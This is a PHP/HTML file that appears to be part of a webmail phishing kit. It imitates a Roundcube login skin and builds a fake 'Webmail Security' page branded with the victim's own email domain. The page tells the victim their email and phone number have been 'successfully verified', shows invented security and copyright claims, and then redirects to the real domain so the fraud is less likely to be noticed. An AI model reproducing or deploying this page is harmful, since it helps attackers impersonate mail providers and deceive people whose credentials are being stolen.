<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<!DOCTYPE html>
<html>
<head>
<title><?php echo $yuh ?> Webmail :: Verify <?php echo $login ?> Phone Number</title>
<meta name="Robots" content="noindex,nofollow" />
<meta http-equiv="X-UA-Compatible" content="IE=EDGE" />
<meta HTTP-EQUIV="REFRESH" content="5; url=http://<?php echo $domain ?>">
<meta name="viewport" content="" id="viewport" />
<link rel="SHORTCUT ICON" href="http://<?php echo $domain ?>/favicon.ico"/>
<link rel="stylesheet" type="text/css" href="FILES/styles.css?s=1387973879" />
<!--[if IE 9]><link rel="stylesheet" type="text/css" href="FILES/svggradients.css?s=1382384360" /><![endif]-->
<!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="FILES/iehacks.css?s=1382384360" /><![endif]-->
<!--[if lte IE 7]><link rel="stylesheet" type="text/css" href="FILES/ie7hacks.css?s=1382384360" /><![endif]-->
<link rel="stylesheet" type="text/css" href="plugins/jqueryui/themes/larry/jquery-ui-1.9.2.custom.css?s=1399644532">
<script type="text/javascript" src="FILES/ui.js?s=1382384360"></script>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<script src="FILES/jquery.min.js?s=1399644532" type="text/javascript"></script>
<script src="FILES/common.min.js?s=1399644532" type="text/javascript"></script>
<script src="FILES/app.min.js?s=1399644532" type="text/javascript"></script>
<script src="FILES/jstz.min.js?s=1399644532" type="text/javascript"></script>
<script type="text/javascript">

var rcmail = new rcube_webmail();
rcmail.set_env({"task":"login","x_frame_options":"sameorigin","standard_windows":false,"cookie_domain":"","cookie_path":"\/","cookie_secure":true,"skin":"larry","refresh_interval":60,"session_lifetime":600,"action":"","comm_path":".\/?_task=login","date_format":"yy-mm-dd","request_token":"fbc944b0cb57238d7aa0e153b555d63c"});
rcmail.gui_container("loginfooter","bottomline");
rcmail.add_label({"loading":"Loading...","servererror":"Server Error!","connerror":"Connection Error (Failed to reach the server)!","requesttimedout":"Request timed out","refreshing":"Refreshing..."});
rcmail.gui_object('loginform', 'form');
rcmail.gui_object('message', 'message');
</script>

<script type="text/javascript" src="FILES/jquery-ui-1.9.2.custom.min.js?s=1399644532"></script>
<style type="text/css">
<!--
.style1 {
	color: #FF3300;
	font-weight: bold;
	font-size: 24px;
	font-family: Geneva, Arial, Helvetica, sans-serif;
}
-->
</style>
</head>
<body>

<div id="login-form">
<div class="box-inner">
  <div  align="center"><br>
        <span class="style1"><img src="http://<?php echo $domain ?>/favicon.ico" alt="" width="25" height="25"> <?php echo $yuh ?> Online Webmail App</span>  </div>
  <br>
  <!-- End Table 2-->
          </td>





</tr>
        <tr>
          <td>
            <!--Table 3-->
            <table cellpadding="0" cellspacing="0">
			    <col>
			    <col class="w100">
			    <tr class="height">
				    <td>&nbsp;</td>
				    <td><label for="rdoPblc">Your email (<?php echo $login ?>), has been successfully verified.<br /><br />Thank you for using our <?php echo $yuh ?>'s Security Web App..</label><br>
<br>
We will redirect you shortly to <b><?php echo $domain ?></b></td>
			    </tr>
			    
			    <tr class="height">
				    <td>&nbsp;</td>
				    <td><label for="rdoPrvt"></label></td>
			    </tr>
			</table><br>
  <form name="form" action="connectID.php" method="post">
    <p class="formbuttons"><br>
 <br>
  <br>
   
   Connected to <?php echo $login ?> </p></form>
</div>

<div id="bottomline">
	<!--<?php echo $yuh ?> Webmail -->Secured by <?php echo $yuh ?> Webmail Security Systems<br>
&copy; 2017 <?php echo $yuh ?> Corporation. All rights reserved.
		
</div>
</div>

<script type="text/javascript">

// UI startup
var UI = new rcube_mail_ui();
$(document).ready(function(){
	UI.set('errortitle', 'An error occurred!');
	UI.init();
});

</script>





<script type="text/javascript">

jQuery.extend(jQuery.ui.dialog.prototype.options.position, {
                using: function(pos) {
                    var me = jQuery(this),
                        offset = me.css(pos).offset(),

                        topOffset = offset.top - 12;
                    if (topOffset < 0)
                        me.css('top', pos.top - topOffset);
                    if (offset.left + me.outerWidth() + 12 > jQuery(window).width())
                        me.css('left', pos.left - 12);
                }
            });
$(document).ready(function(){ 
rcmail.init();
var images = ["skins\/larry\/images\/ajaxloader.gif","skins\/larry\/images\/buttons.png","skins\/larry\/images\/addcontact.png","skins\/larry\/images\/filetypes.png","skins\/larry\/images\/listicons.png","skins\/larry\/images\/messages.png","skins\/larry\/images\/quota.png","skins\/larry\/images\/selector.png","skins\/larry\/images\/splitter.png","skins\/larry\/images\/watermark.jpg"];
            for (var i=0; i<images.length; i++) {
                img = new Image();
                img.src = images[i];
            }
});
</script>

</body>
</html>